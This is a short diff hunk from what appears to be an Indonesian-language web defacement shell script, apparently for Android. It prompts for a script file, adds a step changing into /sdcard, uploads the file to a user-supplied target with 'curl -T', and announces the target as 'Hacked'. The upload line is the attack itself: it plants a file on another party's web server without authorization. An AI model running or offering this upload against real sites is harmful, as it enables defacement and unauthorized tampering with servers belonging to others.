@@ -80,6 +80,7 @@ echo $red
 read -p "Nama Script=>"  script
 echo $cyan
 echo loading..
+cd /sdcard
 curl -T $script $target
 echo $red
 echo [$target~Hacked]
